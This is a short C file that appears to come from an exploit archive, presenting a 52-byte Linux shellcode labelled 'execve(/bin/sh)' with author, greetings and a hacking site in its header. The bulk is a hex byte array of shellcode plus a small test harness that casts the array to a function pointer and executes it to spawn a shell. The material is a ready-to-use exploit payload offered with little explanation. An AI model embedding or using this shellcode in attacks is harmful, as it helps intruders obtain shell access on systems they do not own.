/*

Exploit Title : linux/x86-64 execve(/bin/sh) 52 bytes
Tested on     : Linux iron 2.6.38-8-generic #42-Ubuntu SMP Mon Apr 11 03:31:24 UTC 2011 x86_64 x86_64 x86_64 GNU/Linux
Date          : 03/12/2011
Author        : X-h4ck
Email         : mem001@live.com
Website       : http://www.pirate.al
Greetz        : mywisdom - Danzel - Wulns~ - IllyrianWarrior- Ace - M4yh3m - Saldeath
                ev1lut1on - bi0 - Slimshaddy - d3trimentaL - Lekosta
                CR - Hack-Down - H3ll - Pretorian - d4nte_sA

*/


char SC[] =   "\xeb\x1d\x5b\x31\xc0\x67\x89\x43\x07\x67\x89\x5b\x08\x67\x89\x43\x0c"\
              "\x31\xc0\xb0\x0b\x67\x8d\x4b\x08\x67\x8d\x53\x0c\xcd\x80\xe8\xde\xff"\
              "\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42"\
              "\x42";

int
main (int argc, char **argv)
{
        int (*ret)();
        ret = (int(*)())SC;

        (int)(*ret)();
        exit(0);
}